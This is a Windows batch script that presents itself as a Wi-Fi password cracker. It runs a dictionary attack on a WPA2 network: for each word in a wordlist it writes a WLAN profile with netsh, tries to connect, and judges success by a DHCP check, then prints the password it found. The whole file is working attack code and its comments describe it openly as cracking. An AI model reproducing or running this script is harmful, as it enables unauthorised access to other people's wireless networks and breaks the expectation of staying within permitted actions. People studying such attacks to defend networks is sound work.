@echo off


setlocal

rem Te Below 4 Lines are for faunctionality  and in the main script will be replaced by the VARs
rem From the other functions.

set SNN=SIDDIQ
set hex=534944444951
set SNN2="%SNN%"
set Builtin=TMP\Builtin.tmp

rem This is the main Cracking Function  or the main loop it handel generating a profile template
rem and loop throw  the word  list and when it finds the correct word it will stop and print the 
rem correct password for the network.
:main
    rem This is the template fill loop, use network name and hex value and  one word at the time
    :loop
        for /f %%i in (%Builtin%) do (
        rem This is the Profile Template To Use  :Starts Here:
        echo ^<?xml version="1.0"?^>> WiFi-%SNN2%.xml
        echo ^<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1"^>>> WiFi-%SNN2%.xml
        echo 	 ^<name^>%SNN%^</name^>>> WiFi-%SNN2%.xml
        echo 	 ^<SSIDConfig^>>> WiFi-%SNN2%.xml
        echo 		 ^<SSID^>>> WiFi-%SNN2%.xml
        echo 			 ^<hex^>%hex%^</hex^>>> WiFi-%SNN2%.xml            
        echo 			 ^<name^>%SNN%^</name^>>> WiFi-%SNN2%.xml    
        echo 		 ^</SSID^>>> WiFi-%SNN2%.xml         
        echo 	 ^</SSIDConfig^>>> WiFi-%SNN2%.xml      
        echo 	 ^<connectionType^>ESS^</connectionType^>>> WiFi-%SNN2%.xml          
        echo 	 ^<connectionMode^>auto^</connectionMode^>>> WiFi-%SNN2%.xml
        echo 	 ^<MSM^>>> WiFi-%SNN2%.xml
        echo 		 ^<security^>>> WiFi-%SNN2%.xml
        echo 			 ^<authEncryption^>>> WiFi-%SNN2%.xml
        echo 				 ^<authentication^>WPA2PSK^</authentication^>>> WiFi-%SNN2%.xml
        echo 				 ^<encryption^>AES^</encryption^>>> WiFi-%SNN2%.xml
        echo 				 ^<useOneX^>false^</useOneX^>>> WiFi-%SNN2%.xml
        echo 			 ^</authEncryption^>>> WiFi-%SNN2%.xml
        echo 			 ^<sharedKey^>>> WiFi-%SNN2%.xml
        echo 				 ^<keyType^>passPhrase^</keyType^>>> WiFi-%SNN2%.xml
        echo 				 ^<protected^>false^</protected^>>> WiFi-%SNN2%.xml
        echo 				 ^<keyMaterial^>%%i^</keyMaterial^>>> WiFi-%SNN2%.xml
        echo 			 ^</sharedKey^>>> WiFi-%SNN2%.xml
        echo 		 ^</security^>>> WiFi-%SNN2%.xml
        echo 	 ^</MSM^>>> WiFi-%SNN2%.xml
        echo 	 ^<MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3"^>>> WiFi-%SNN2%.xml
        echo 		 ^<enableRandomization^>false^</enableRandomization^>>> WiFi-%SNN2%.xml
        echo  	 ^</MacRandomization^>>> WiFi-%SNN2%.xml
        echo ^</WLANProfile^>>> WiFi-%SNN2%.xml
        rem This is the Profile Template To Use  :Ends Here:
    
        rem This Will Add The Profile And Connect To It 
              netsh wlan add profile filename=WiFi-%SNN2%.xml interface="WiFi" >nul
              del WiFi-%SNN2%.xml >nul
              netsh wlan connect SSID=%SNN2% name=%SNN2% >nul
              timeout /t 2 >nul
    
        rem This will Test Every Word To Internet Connection And Stop If Found The Correct One It Will
        rem Also Stop If Not Correct Word Found       
              echo  Testing : %%i
              set pass=%%i
              more +1 TMP\Builtin.tmp > TMP\SUB\Builtin.tmp
              del TMP\Builtin.tmp 
              move TMP\SUB\Builtin.tmp TMP\Builtin.tmp >nul
              goto :Condetion
            )
    rem Condetion Function handel the check for match from the template filling loop after init connection
    :condetion
    rem condetion looking for the most rare charector used in passwords "~" to count the wodlist 
       type TMP\Builtin.tmp | find /v /c "~" >TMP\count.tmp
       set /p cnt=<TMP\count.tmp
       echo is %cnt%
       del TMP\count.tmp
       rem This if Statment checks if the wordlist has words or empty "1"=Empty
       if "%cnt%"=="1" (
          echo No Match Found !!
         goto :eof
       ) else (
          goto :Statment
       )
       rem Statment function Actualy check for real ip address existance to determin if
       rem The connection was successful, and breakout of the main loop if it is
       :Statment
          ipconfig /showclassid WiFi | find "There are no DHCPv4 classes defined for WiFi."> TMP\Condetion.tmp
          set /p condetion=<TMP\Condetion.tmp
          if "%condetion%"=="There are no DHCPv4 classes defined for WiFi." (
             echo *****************************
             echo Done ! Found The Password 
             echo pass is : %pass%
             echo *****************************
             goto :Success
          ) else (
             netsh wlan disconnect
             netsh wlan delete profile name=%SNN2% i=* >nul
             goto :loop
          )
    rem this function just to terminate the script but in the main script will contain the final screen
    :Success
    del TMP\Builtin.tmp TMP\Condetion.tmp
       endlocal
       goto :eof

